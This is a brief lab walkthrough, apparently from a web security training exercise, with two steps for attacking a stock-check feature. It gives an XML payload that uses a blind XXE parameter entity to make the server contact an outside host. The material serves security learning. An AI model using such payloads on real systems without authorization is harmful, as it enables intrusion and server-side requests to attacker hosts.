
1. Access the lab and verify the check stock feature
2. Insert the following payload at the check stock request

![](/static/img/Pasted_image_20231113181149.png)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://foo.com"> %xxe; ]>
<stockCheck><productId>4</productId><storeId>1</storeId></stockCheck>
```

![](/static/img/Pasted_image_20231113181320.png)

